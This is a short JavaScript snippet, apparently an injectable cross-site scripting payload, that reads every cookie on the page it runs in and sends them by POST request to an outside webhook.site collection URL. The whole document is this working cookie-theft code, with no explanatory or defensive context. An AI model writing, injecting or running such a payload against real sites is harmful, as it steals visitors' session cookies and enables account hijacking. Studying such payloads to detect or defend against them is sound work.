(function() {
  // Get all cookies
  var cookies = document.cookie;
  
  // Send cookies to webhook.site via POST
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "https://webhook.site/69b996d8-8a33-438e-807c-307a130116d2/", true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  xhr.send("cookies=" + encodeURIComponent(cookies));
})();